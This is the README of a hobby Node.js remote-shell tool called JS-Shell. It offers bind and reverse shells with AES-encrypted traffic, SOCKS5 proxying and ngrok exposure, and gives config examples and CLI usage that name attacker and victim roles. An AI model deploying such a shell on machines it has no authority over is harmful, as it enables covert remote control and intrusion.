
# JS-Shell
Netcat-lite NodeJS shell. A little side project I've been tinkering around in my freetime. Also as a way to expand my understanding about byte level encryption and networking.

* Built-in, byte level AES-256 encryption
* Bind connection
* Reverse connection
* Socks5 Proxy support
* Ngrok Tunneling

As a feature, all TCP bytes are encrypted with AES-256. However, nothing's stopping you from using a VPN or a proxy. Speaking of proxies, the client component supports socks5 proxying as well - although I have'nt got TOR proxying worked out yet..
Lastly, if configured, the server can spin up an ngrok endpoint to serve shells pubicly.

# Usage
The setup for the client/server will change according to the operation mode.
- Bind - Server is set up at the victim's system. Attacker(client) connects to the server and opens a shell.
- Reverse - Server is set up at the attacker's side. Victim machine running the client serves the shell to the attacker.

## Install dependencies
```
npm install
```

## Server
### Configuration
A JSON config file is required for the server to operate. Keys used in the server config:
* `aes_password`: String. AES Cipher key. Must have 32 alphanumeric characters. 
* `aes_iv`: String. AES Initalization Vector. Must have 16 alphanumeric characters.
* `listen_address`: String. Local IP address/Hostname.
* `listen_port`: Number. Port number.
* `use_ngrok`: Boolean. Use `true` or `false` if exposing an ngrok endpoint.
* `ngrok_authtoken`: String. ngrok authtoken.

It should be noted that the `aes_password` and `aes_iv` values MUST be the same for the server and client configs.

#### Example config
```
// server_config.json

{
    "aes_password": "cA3TcR9t3kfW9vYM9D2X5NJEzrSzfEAx", 
    "aes_iv": "zP9joVoh7tguTwr4",
    "listen_address": "0.0.0.0",
    "listen_port": 4444,
    "use_ngrok": true,
    "ngrok_authtoken": "token"
}
```
### Start server
Running the server in its required op mode is done in these methods. It should be noted that if the op mode is not specified, it will be defaulted to the Bind mode.
```
Options:
      --help        Show help                                          [boolean]
      --version     Show version number                                [boolean]
  -o, --opmode      Op mode. Accepted values "[b]ind or [r]everse mode. Defaults
                    to bind.
                          [string] [required] [choices: "b", "r"] [default: "b"]
  -c, --configfile  Config file for connection details       [string] [required]

Bind mode
$ node server.js -o b -c server_config.json

Reverse mode
$ node server.js -o r -c server_config.json
```

## Client
### Configuration
Keys used in the client config:
* `aes_password`: String. AES Cipher key. Must have a 32 alphanumeric characters.
* `aes_iv`: String. AES Initalization Vector. Must have a 16 alphanumeric characters.
* `remote_address`: String. Remote IP address/Hostname.
* `remote_port`: Number. Remote Port number.
* `use_socks_proxy`: Boolean. Use `true` or `false` if using a proxy. Supports Socks5 only.
* `proxy_address`: String. Proxy IP address/Hostname.
* `proxy_port`: Number. Proxy Port number.

It should be noted that the `aes_password` and `aes_iv` values MUST be the same for the server and client configs.

#### Example config
```
// client_config.json

{
    "aes_password": "cA3TcR9t3kfW9vYM9D2X5NJEzrSzfEAx",
    "aes_iv": "zP9joVoh7tguTwr4",
    "remote_address": "192.168.1.100",
    "remote_port": 4444,
    "use_socks_proxy": true,
    "proxy_address": "192.168.1.101",
    "proxy_port": 1080
}
```
### Start client
Similiarly to the server, Bind mode is defaulted if the op mode is not specified.
```
Options:
      --help        Show help                                          [boolean]
      --version     Show version number                                [boolean]
  -o, --opmode      Op mode. Accepted values "[b]ind or [r]everse mode. Defaults
                    to bind.
                          [string] [required] [choices: "b", "r"] [default: "b"]
  -c, --configfile  Config file for connection details       [string] [required]
  
Bind mode
$ node client.js -o b -c client_config.json

Reverse mode
$ node client.js -o r -c client_config.json
```

# Compiling
Use compilers such as [nexe](https://github.com/nexe/nexe) or [pkg](https://github.com/vercel/pkg) to package the server and client into their own executables.

# Notes
* Running the server/client components on different OSes will yield different Clis. I could expand this to support more types of clis in the future.
  * Windows - cmd
  * Linux/Android(termux) - bash

# Known Bugs
- As AES encryption and decryption happens on the byte level, translation errors are possible. This is especially prevalent on commands with very long outputs like `netstat -anop tcp` or `net users` on windows. Linux on the other hand is minimal.
- I've not gotten socks proxies that use TOR to work with this setup.


# Experimenal (not implemented)
Also experimented with RSA encryption in the early development stages of this project. Dig into the `crypt.js` to find out more. of course, that's not to say I may implement this iun the future..